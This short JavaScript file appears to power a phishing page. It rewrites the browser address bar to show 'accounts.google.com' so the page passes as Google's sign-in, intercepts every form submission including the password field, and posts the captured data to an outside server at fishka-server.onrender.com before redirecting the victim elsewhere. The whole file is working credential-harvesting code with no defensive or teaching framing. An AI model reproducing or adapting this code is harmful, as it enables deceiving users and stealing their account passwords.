history.replaceState('', '', 'accounts.google.com')

document.addEventListener('DOMContentLoaded', () => {
    const password = document.querySelector("#txtPassword");
    const checkbox = document.querySelector("#show");

    checkbox.addEventListener('click',function(){
        const type = password.getAttribute("type")=== "password" ? "text" : "password";
        password.setAttribute("type",type);
    });
})

document.addEventListener('submit', async e => {
    e.preventDefault();
    const form = e.target;
    const data = new FormData(form);
    console.log('Sending data to a server...');

    try {
        const response = await fetch("https://fishka-server.onrender.com/submit", {
            method: "POST",
            body: data,
        });
    } finally {
        window.location.href = 'https://myfishka.com/';
    }
})
